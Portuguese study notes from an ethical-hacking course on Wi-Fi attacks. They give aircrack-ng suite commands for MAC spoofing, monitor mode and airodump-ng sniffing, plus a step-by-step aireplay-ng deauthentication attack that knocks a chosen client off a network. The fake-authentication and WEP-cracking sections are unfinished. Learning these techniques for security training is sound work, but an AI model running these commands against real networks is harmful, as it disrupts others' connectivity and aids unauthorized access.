
# [Ethical Hacking](https://www.udemy.com/course/learn-ethical-hacking-from-scratch)

> pacotes necessários
```
sudo apt install net-tools aircrack-ng reaver 
```

## change MAC 

```
ifconfig wlan1 down
ifconfig wlan1 hw ether 00:11:22:33:44:55
ifconfig wlan1 up
```

#

## Monitor Mode

```
ifconfig wlan1 down
iwconfig wlan1 mode monitor
ifconfig wlan1 up
```
#

## Sniffing (Airodump-ng)

|||
|-|-|
|BSSID|mac|
|PWR|força do sinal|
|Beacons|broadcast existencia da rede|
|#Data|total de dados trafegados|
|#/s|total de dados trafegados por segundo|
|CH|canal da rede|
|MB|velocidade máxima suportada|
|ENC|encriptação da rede|
|CIPHER|cifra da rede|
|AUTH|autenticação utilizada|
|ESSID|nome da rede|
|STATION|cliente conectado na rede|


### Todas as Redes
```
# interface de rede wifi precisa estar em modo monitor
airodump-ng wlan1
```

### Rede espefífica
```
# interface de rede wifi precisa estar em modo monitor
airodump-ng --channel [canal] --bssid [mac] --write [output file] wlan1
```
#

## Deauthentication Attack

Desautentica um cliente de uma dada rede, sem precisar estar conectado na mesma

1. Listar redes e escolher alvo
```
airodump-ng wlan1
```

2. [Sniffar o alvo](#rede-espefífica). Escolha o client alvo. **Deixe o terminal aberto**
```
airodump-ng --channel 1 --bssid 00:11:22:33:44:55 wlan1
```

3. Realizar deauth
```
aireplay-ng --deauth 10000000 -a [bssid rede] -c [mac client] wlan1
```
#

## Fake Authentication Attack

Gera pacotes de autenticação falsos a uma dada rede, para aumentar o número de pacotes trafegados. Utilizado em ataques como o [WEP cracking](#wep-cracking).


### TO-DO

#

## WEP cracking

### TO-DO

#